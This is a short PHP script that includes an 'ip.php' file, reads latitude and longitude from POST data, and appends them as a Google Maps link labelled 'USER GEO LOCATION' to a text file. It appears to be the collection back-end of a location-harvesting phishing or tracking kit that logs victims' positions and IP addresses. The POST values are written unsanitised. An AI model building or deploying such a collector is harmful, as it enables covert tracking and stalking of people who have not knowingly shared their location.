<?php
include 'ip.php' ;
// Configuration
$file_name = 'location_data.txt';

// Get location data from request
$latitude = $_POST['latitude'];
$longitude = $_POST['longitude'];

// Save location data to file
$file = fopen($file_name, 'a');
fwrite($file, "USER GEO LOCATION:    https://www.google.com/maps/place/$latitude,$longitude\n");
fclose($file);
                                                                                                                                              
?>
